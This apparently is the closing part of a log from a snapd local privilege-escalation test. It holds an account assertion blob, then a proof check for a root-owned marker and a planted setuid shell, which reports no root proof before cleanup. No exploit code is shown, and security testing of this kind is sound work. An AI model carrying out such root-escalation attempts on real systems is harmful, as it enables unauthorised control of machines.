oirqHAfuvNod36yNQIyNqEc20AvTvZNH0PSsg4rq3DLjIPzv5KbJO9lhsasNJK1OdL6x8Yqrdsbk
ldZp4qkzfjV7VOMQKaadfcZPRaVVeJWOBnBiaukzkhoNlQi1sdCdkBB/AJHZF8QXw6c7vPDcfnCV
1lW7ddQ2p8IsJbT6LzpJu3GW/P4xhNgCjtCJ1AJm9a9RqLwQYgdLZwwDa9iCRtqTbRXBlfy3apps
1VjbQ3h5iCd0hNfwDBnGVm1rhLKHCD1DUdNE43oN2ZlE7XGyh0HFV6vKlpqoW3eoXCIxWu+HBY96
+LSl/jQgCkb0nxYyzEYK4Reb31D0mYw1Nji5W+MIF5E09+DYZoOT0UvR05YMwMEOeSdI/hLWg/5P
k+GDK+/KopMmpd4D1+jjtF7ZvqDpmAV98jJGB2F88RyVb4gcjmFFyTi4Kv6vzz/oLpbm0qrizC0W
HLGDN/ymGA5sHzEgEx7U540vz/q9VX60FKqL2YZr/DcyY9GKX5kCG4sNqIIHbcJneZ4frM99oVDu
7Jv+DIx/Di6D1ULXol2XjxbbJLKHFtHksR97ceaFvcZwTogC61IYUBJCvvMoqdXAWMhEXCr0QfQ5
Xbi31XW2d4/lF/zWlAkRnGTzufIXFni7+nEuOK0SQEzO3/WaRedK1SGOOtTDjB8/3OJeW96AUYK5
oTIynkYkEyHWMNCXALg+WQW6L4/YO7aUjZ97zOWIugd7Xy63aT3r/EHafqaY2nacOhLfkeKZ830b
o/ezjoZQAxbh6ce7JnXRgE9ELxjdAhBTpGjmmmN2sYrJ7zP9bOgly0BnEPXGSQfFA+NNNw1FADx1
MUY8q9DBjmVtgqY+1KGTV5X8KvQCBMODZIf/XJPHdCRAHxMd8COypcwgL2vDIIXpOFbi1J/B0GF+
eklxk9wzBA8AecBMCwCzIRHDNpD1oa2we38bVFrOug6e/VId1k1jYFJjiLyLCDmV8IMYwEllHSXp
LQAdm3xZ7t4WnxYC8YSCk9mXf3CZg59SpmnV5Q5Z6A5Pl7Nc3sj7hcsMBZEsOMPzNC9dPsBnZvjs
WpPUffJzEdhHBFhvYMuD4Vqj6ejUv9l3oTrjQWVC

type: account
authority-id: canonical
account-id: generic
display-name: Generic
timestamp: 2017-07-27T00:00:00.0Z
username: generic
validation: certified
sign-key-sha3-384: -CvQKAwRQ5h3Ffn10FILJoEZUXOv6km9FwA80-Rcj-f-6jadQ89VRswHNiEB9Lxk

AcLDXAQAAQoABgUCWYuVIgAKCRDUpVvql9g3II66IACcoxSoX8+PQLa9TNuNBUs3bdTW6V5ZOdE8
vnziIg+yqu3qYfWHcRf1qu7K9Igv5lH3uM5jh2AHlndaoX4Qg1Rm9rOZCkRr1dDUmdRDBXN2pdTA
rc=0

## final cleanup and health

## pre-clean final proof check
MISSING /root/snapd_current_default_deep_root_marker
MISSING /tmp/snapd_current_default_deep_tmp_marker
MISSING /tmp/snapd_current_default_deep_suid_sh
ROOT_PROOF_CANDIDATE=NO
FINAL_ROOT_PROOF=NO
active
active
active
No snaps are installed yet. Try 'snap install hello-world'.
ls: cannot access '/tmp/snapd-current-default-deep': No such file or directory
ls: cannot access '/tmp/snapd-current-default-deep-src': No such file or directory
ls: cannot access '/root/snapd_current_default_deep_root_marker': No such file or directory
ls: cannot access '/tmp/snapd_current_default_deep_tmp_marker': No such file or directory
ls: cannot access '/tmp/snapd_current_default_deep_suid_sh': No such file or directory
ls: cannot access '/tmp/scd-userns-owner-proof': No such file or directory
